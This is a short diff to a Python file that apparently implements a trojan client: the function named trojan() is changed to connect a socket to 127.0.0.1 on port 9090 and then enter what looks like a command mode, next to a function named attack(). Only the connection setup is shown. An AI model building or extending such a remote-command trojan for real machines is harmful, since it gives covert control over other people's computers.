@@ -51,11 +51,11 @@ def attack():
 """
 
 def trojan():
-    hostname = "Cosmes-MBP"
-    HOST = socket.gethostbyname(hostname)
+    client = socket.socket()
+    
+    HOST = "127.0.0.1"
     PORT = 9090
 
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client.connect((HOST, PORT))
 
     cmd_mode = False
